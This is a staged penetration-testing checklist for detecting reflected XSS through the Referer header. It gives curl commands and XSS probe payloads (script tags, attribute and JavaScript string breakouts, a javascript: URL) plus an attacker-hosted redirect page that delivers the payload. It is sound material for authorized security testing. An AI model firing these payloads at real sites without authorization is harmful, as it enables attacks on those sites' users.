
# Referer Header XSS Reflection Checklist

**Goal:** Determine whether the `Referer` HTTP request header value is reflected
unencoded in the HTTP response in a context that enables a reflected XSS payload
to be delivered to a victim via their browser.

**Scope:**
- `Referer` header only — it is the sole header a victim's browser sends
  automatically with attacker-controlled content (the URL of the attacker's page)
- Reflected XSS only — not blind/stored, not cache-poisoned
- Detection only — no filter bypass, no exploitation chain beyond confirming
  unencoded reflection

**Not in scope:** Cookie header, Host/X-Forwarded-Host, User-Agent,
X-Forwarded-For (attacker cannot control these through a victim's browser),
filter bypass techniques, blind or stored XSS.

---

## Definitions

| Term | Meaning here |
|------|-------------|
| **Referer** | The `Referer` HTTP request header — the browser sends the URL of the current page when navigating to a new one |
| **Attacker-controlled value** | The URL of the attacker's page (victim navigates *from* attacker page *to* target) |
| **Reflection** | The literal Referer value, or a decoded form of it, appears verbatim in the response body |
| **Deliverable** | A browser will send the payload characters unencoded, or the server URL-decodes the value before reflecting |

---

## Required Tools

Install before starting.

- [ ] `curl` — header injection and response inspection
- [ ] `grep` — pattern matching in responses
- [ ] `gau` — historical URL collection for candidate discovery (optional)
- [ ] `httpx` (projectdiscovery) — bulk Referrer-Policy header check

Verify installs:
```bash
curl --version && gau --version && httpx -version
```

---

## Stage 0 — Setup

- [ ] Set the target:
  ```bash
  export TARGET="https://target.com"
  export DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | cut -d/ -f1)
  ```
- [ ] Create working directory:
  ```bash
  mkdir -p referer-xss/{candidates,results}
  ```
- [ ] Set a unique canary string (alphanumeric, >8 chars, no special chars):
  ```bash
  export CANARY="refx$(date +%s)"
  echo "Canary: $CANARY"
  ```

---

## Stage 1 — Candidate Endpoint Identification

Goal: Build a list of endpoints likely to consume or reflect the `Referer` header.

Applications commonly reflect `Referer` on:

- Login, logout, and registration pages (redirect-after-login reads Referer)
- Password reset pages
- HTTP error pages (404, 403, 500) — frequently show "you came from..."
- "Go back" / breadcrumb navigation
- Contact and support forms (some embed Referer in page metadata)
- Analytics-heavy pages (third-party analytics scripts sometimes embed Referer in
  inline JS objects)
- Any page that displays browsing context or session origin information

**Option A — Manual list:**
```bash
cat > referer-xss/candidates/endpoints.txt << EOF
$TARGET/login
$TARGET/logout
$TARGET/signup
$TARGET/register
$TARGET/password-reset
$TARGET/forgot-password
$TARGET/contact
$TARGET/support
$TARGET/404
$TARGET/
# Add pages found during manual browsing
EOF
```

**Option B — Pull from Wayback + Common Crawl:**
```bash
gau --blacklist png,jpg,jpeg,gif,svg,ico,woff,woff2,ttf,css,pdf,zip,gz \
    --o referer-xss/candidates/all_urls.txt \
    "$DOMAIN"

# Filter to Referer-likely surfaces by path keyword
grep -iE '/(login|logout|signup|register|reset|forgot|auth|error|404|403|500|contact|support|back|return|redirect)' \
    referer-xss/candidates/all_urls.txt \
    > referer-xss/candidates/filtered_endpoints.txt

echo "$TARGET/" >> referer-xss/candidates/filtered_endpoints.txt
sort -u referer-xss/candidates/filtered_endpoints.txt -o referer-xss/candidates/filtered_endpoints.txt
echo "Candidate endpoints: $(wc -l < referer-xss/candidates/filtered_endpoints.txt)"
```

---

## Stage 2 — Referrer-Policy Check

Goal: Identify which endpoints will actually receive a full Referer URL from a
victim's browser. Endpoints with restrictive policies cannot be exploited through
a victim's browser even if the server reflects the value.

- [ ] Fetch the `Referrer-Policy` response header for each candidate:
  ```bash
  httpx -l referer-xss/candidates/filtered_endpoints.txt \
      -silent \
      -no-color \
      -include-response-header \
      -match-regex '(?i)referrer-policy' \
      -json \
      -o referer-xss/results/referrer_policy_raw.jsonl

  # Fallback using curl if httpx flag unavailable
  while read url; do
    policy=$(curl -s -I -L --max-redirs 3 "$url" \
      | grep -i 'referrer-policy' | tr -d '\r')
    echo "$url | ${policy:-no-referrer-policy-set}"
  done < referer-xss/candidates/filtered_endpoints.txt \
    > referer-xss/results/referrer_policy.txt

  cat referer-xss/results/referrer_policy.txt
  ```

- [ ] Classify by deliverability:

  | Policy value | Referer sent by browser | Deliverable? |
  |---|---|---|
  | `unsafe-url` | Full URL always | Yes |
  | `no-referrer-when-downgrade` | Full URL on HTTPS→HTTPS | Yes |
  | *(no header set)* | Browser applies its own default — see note | See note |
  | `strict-origin-when-cross-origin` | Origin only cross-origin | Path payload not deliverable |
  | `origin` or `strict-origin` | Origin only | Path payload not deliverable |
  | `same-origin` | Only sent on same-origin navigations | No (attacker page is cross-origin) |
  | `no-referrer` | Nothing | No |

  > **Browser default note:** Chrome and Firefox default to
  > `strict-origin-when-cross-origin` since 2020. With no policy header set,
  > cross-origin navigations send **only the origin** (e.g., `https://attacker.com`),
  > not the full URL. Test if the application reflects the origin-only value —
  > attacker controls the subdomain/domain so it may still be useful.

- [ ] Separate exploitable from blocked endpoints:
  ```bash
  # Full URL deliverable
  grep -iE 'unsafe-url|no-referrer-when-downgrade|no-referrer-policy-set' \
    referer-xss/results/referrer_policy.txt \
    > referer-xss/results/policy_full_url.txt

  # Origin only — attacker controls the domain value
  grep -iE '\borigin\b|strict-origin' \
    referer-xss/results/referrer_policy.txt \
    > referer-xss/results/policy_origin_only.txt

  # Not deliverable via browser
  grep -iE 'no-referrer\b|same-origin' \
    referer-xss/results/referrer_policy.txt \
    > referer-xss/results/policy_blocked.txt

  echo "Full URL deliverable: $(wc -l < referer-xss/results/policy_full_url.txt)"
  echo "Origin only:          $(wc -l < referer-xss/results/policy_origin_only.txt)"
  echo "Blocked:              $(wc -l < referer-xss/results/policy_blocked.txt)"
  ```

  Continue to Stage 3 with `policy_full_url.txt` as the primary target list.
  Keep `policy_origin_only.txt` as a secondary list — test it separately with
  the domain-canary variant in Stage 3.

---

## Stage 3 — Canary Injection

Goal: Confirm which endpoints echo the `Referer` header value in the response body.

### 3A — Full URL Reflection (primary targets)

- [ ] Test each endpoint in `policy_full_url.txt` with the canary in the Referer path:
  ```bash
  while read entry; do
    url=$(echo "$entry" | awk '{print $1}')
    response=$(curl -s -L --max-redirs 3 \
      -H "Referer: https://attacker.com/$CANARY" \
      "$url")
    if echo "$response" | grep -qi "$CANARY"; then
      echo "[REFLECTED-PATH] $url"
    fi
  done < referer-xss/results/policy_full_url.txt \
    | tee referer-xss/results/reflected_endpoints.txt
  ```

- [ ] Also test with canary as the Referer domain (catches apps that parse only the
  origin portion even with a full-URL policy):
  ```bash
  while read entry; do
    url=$(echo "$entry" | awk '{print $1}')
    response=$(curl -s -L --max-redirs 3 \
      -H "Referer: https://$CANARY.attacker.com/" \
      "$url")
    if echo "$response" | grep -qi "$CANARY"; then
      echo "[REFLECTED-DOMAIN] $url"
    fi
  done < referer-xss/results/policy_full_url.txt \
    >> referer-xss/results/reflected_endpoints.txt
  ```

### 3B — Origin-Only Reflection (secondary targets)

- [ ] Test `policy_origin_only.txt` endpoints with canary as the registered domain:
  ```bash
  # Browser will send only "https://<domain>" — attacker controls the domain
  while read entry; do
    url=$(echo "$entry" | awk '{print $1}')
    response=$(curl -s -L --max-redirs 3 \
      -H "Referer: https://$CANARY.com" \
      "$url")
    if echo "$response" | grep -qi "$CANARY"; then
      echo "[REFLECTED-ORIGIN-ONLY] $url"
    fi
  done < referer-xss/results/policy_origin_only.txt \
    >> referer-xss/results/reflected_endpoints.txt
  ```

- [ ] Review all confirmed reflection points:
  ```bash
  sort -u referer-xss/results/reflected_endpoints.txt
  echo ""
  echo "Total endpoints with Referer reflection: \
    $(wc -l < referer-xss/results/reflected_endpoints.txt)"
  ```

---

## Stage 4 — Context Analysis

Goal: For each reflecting endpoint, determine the HTML or JavaScript context that
the Referer value lands in. The context dictates which payload will work.

For each URL in `reflected_endpoints.txt`:

- [ ] View 40 characters of surrounding context:
  ```bash
  URL="https://target.com/PAGE"
  curl -s -L -H "Referer: https://attacker.com/$CANARY" "$URL" \
    | grep -oi ".\{0,40\}${CANARY}.\{0,40\}"
  ```

- [ ] Identify the context from the surrounding output:

  | Surrounding text | Context | Characters needed to break out |
  |---|---|---|
  | `<p>...CANARY...</p>` or raw text | HTML body | `<` `>` |
  | `value="...CANARY..."` | Double-quoted HTML attribute | `"` |
  | `value='...CANARY...'` | Single-quoted HTML attribute | `'` |
  | `href="...CANARY..."` | URL attribute | `"` then tag chars |
  | `var x = "...CANARY..."` | JS double-quoted string | `"` |
  | `var x = '...CANARY...'` | JS single-quoted string | `'` |
  | `` `...CANARY...` `` | JS template literal | `${` `}` |
  | `{"key": "...CANARY..."}` | JS object / JSON string | `"` |

- [ ] Confirm which characters survive unencoded — send individual character probes:
  ```bash
  URL="https://target.com/PAGE"

  for CHAR in '<' '>' '"' "'" '(' ')'; do
    result=$(curl -s -L \
      -H "Referer: https://attacker.com/probe${CHAR}end" \
      "$URL" | grep -oi ".\{0,5\}probe.\{0,5\}")
    echo "Char [$CHAR] response: $result"
  done
  ```

  A character is **safe** (not encoded) if it appears literally in the response.
  A character is **encoded** if it appears as `&lt;`, `&quot;`, `%3C`, etc.

---

## Stage 5 — XSS Probe

Goal: Confirm that a minimal XSS probe for the identified context reflects in the
response without encoding. Select the probe matching the context from Stage 4.

- [ ] **HTML body context** (requires `<` `>` to be unencoded):
  ```bash
  curl -s -L \
    -H "Referer: https://attacker.com/<script>alert(1)</script>" \
    "https://target.com/PAGE" \
    | grep -oi ".\{0,10\}<script>alert.\{0,10\}"
  ```

- [ ] **Double-quoted HTML attribute** (requires `"` to be unencoded):
  ```bash
  curl -s -L \
    -H 'Referer: https://attacker.com/" onmouseover="alert(1)' \
    "https://target.com/PAGE" \
    | grep -i 'onmouseover'
  ```

- [ ] **Single-quoted HTML attribute** (requires `'` to be unencoded):
  ```bash
  curl -s -L \
    -H "Referer: https://attacker.com/' onmouseover='alert(1)" \
    "https://target.com/PAGE" \
    | grep -i 'onmouseover'
  ```

- [ ] **JS double-quoted string** (requires `"` to be unencoded):
  ```bash
  curl -s -L \
    -H 'Referer: https://attacker.com/"+alert(1)+"' \
    "https://target.com/PAGE" \
    | grep -i 'alert(1)'
  ```

- [ ] **JS single-quoted string** (requires `'` to be unencoded):
  ```bash
  curl -s -L \
    -H "Referer: https://attacker.com/';alert(1)//" \
    "https://target.com/PAGE" \
    | grep -i 'alert(1)'
  ```

- [ ] **JS object / JSON string** (requires `"` and `,` to be unencoded):
  ```bash
  curl -s -L \
    -H 'Referer: https://attacker.com/"+alert(1),"":""' \
    "https://target.com/PAGE" \
    | grep -i 'alert(1)'
  ```

- [ ] **URL / href context** (`javascript:` protocol not stripped):
  ```bash
  curl -s -L \
    -H "Referer: javascript:alert(1)" \
    "https://target.com/PAGE" \
    | grep -i 'javascript:alert'
  ```

  > **Pass criterion:** The payload appears in the response body literally
  > (not HTML-encoded as `&lt;`, not URL-encoded as `%3C`).

---

## Stage 6 — Browser Deliverability

Goal: Determine whether a victim's browser will actually send the payload
characters unencoded in the `Referer` header when navigating from the
attacker's page.

Browsers apply their own URL encoding to the `Referer` value even when it is
set via JavaScript navigation. Characters that cannot survive this encoding
require the server to URL-decode the value before reflecting it.

- [ ] Check which payload characters are browser-safe in a Referer URL:

  | Character | Typically sent unencoded? | Notes |
  |---|---|---|
  | `'` single quote | Usually yes | Safe for JS single-quoted string breakout |
  | `(` `)` parentheses | Usually yes | Safe for `alert(1)` etc. |
  | `-` `_` `.` `~` | Yes | RFC 3986 unreserved |
  | `/` `:` `?` `#` `@` | Yes (structural URL chars) | Part of URL syntax |
  | `<` `>` | No — encoded `%3C` `%3E` | Blocks HTML/script tag injection |
  | `"` double quote | No — encoded `%22` | Blocks double-quote attribute breakout |
  | `{` `}` `[` `]` | No — encoded | Blocks template literal injection |
  | Space | No — encoded `%20` | |

- [ ] **For JS single-quoted string context** (the most browser-deliverable case):
  Confirm the single-quote payload survives in a real browser Referer by
  capturing the request in Burp while navigating with a test page:
  ```html
  <!-- Host at attacker.com/test.html -->
  <script>window.location = "https://target.com/PAGE";</script>
  ```
  Verify in Burp Proxy that the browser actually sends:
  `Referer: https://attacker.com/test.html`
  Then test with a path-embedded payload:
  ```html
  <!-- Host at attacker.com/';alert(1)//index.html -->
  <script>window.location = "https://target.com/PAGE";</script>
  ```
  Capture and confirm the Referer value in the request.

- [ ] **For contexts requiring `<` `>` or `"`** — check if the server URL-decodes
  the Referer before reflecting it:
  ```bash
  # Send URL-encoded angle brackets — if they reflect decoded, server decodes input
  curl -s -L \
    -H "Referer: https://attacker.com/%3Cscript%3Ealert(1)%3C%2Fscript%3E" \
    "https://target.com/PAGE" \
    | grep -i '<script>alert'
  ```
  If the response contains `<script>alert(1)</script>` (decoded form), the endpoint
  is exploitable via browser even for HTML context injection.

- [ ] Record deliverability result per endpoint:
  - `DELIVERABLE` — payload characters are browser-safe in Referer URLs
  - `DELIVERABLE (server decodes)` — requires browser-encoded chars but server decodes
  - `NOT DELIVERABLE VIA BROWSER` — payload chars are encoded by browser, server
    does not decode before reflecting

---

## Stage 7 — Result Documentation

For each confirmed finding, record to `referer-xss/results/findings.txt`:

```
URL:           https://target.com/PAGE
Policy:        no-referrer-when-downgrade | unsafe-url | (none)
Canary hit:    path | domain | origin-only
Context:       html-body | attr-double | attr-single | js-double | js-single | js-object | url-href
Chars unencoded: <list>
XSS probe:     <exact payload that reflected unencoded>
Deliverable:   yes | yes (server decodes) | no
Notes:
---
```

---

## Checklist Summary — Run Order

```
Stage 0  — Setup: target, directories, canary
Stage 1  — Identify candidate Referer-consuming endpoints
Stage 2  — Referrer-Policy check: filter out unexploitable endpoints
Stage 3A — Canary injection: full URL reflection (primary targets)
Stage 3B — Canary injection: origin-only reflection (secondary targets)
Stage 4  — Context analysis: determine HTML/JS context of reflection
Stage 5  — XSS probe: confirm payload reflects unencoded per context
Stage 6  — Browser deliverability: verify payload survives browser Referer encoding
Stage 7  — Document findings
```

---

## Output Files Reference

| File | Contents |
|------|---------|
| `referer-xss/candidates/endpoints.txt` | Manually listed candidate endpoints |
| `referer-xss/candidates/filtered_endpoints.txt` | Wayback-sourced candidates, filtered |
| `referer-xss/results/referrer_policy.txt` | Referrer-Policy header per endpoint |
| `referer-xss/results/policy_full_url.txt` | Endpoints where browser sends full URL |
| `referer-xss/results/policy_origin_only.txt` | Endpoints where browser sends origin only |
| `referer-xss/results/policy_blocked.txt` | Endpoints where browser sends nothing |
| `referer-xss/results/reflected_endpoints.txt` | Confirmed Referer reflection endpoints |
| `referer-xss/results/findings.txt` | Documented findings with context and deliverability |

---

*Checklist version: 2026-05-04. Scope: Referer header reflected XSS — detection only.
No filter bypass, no blind XSS, no cache poisoning, no cookie or Host header testing.*
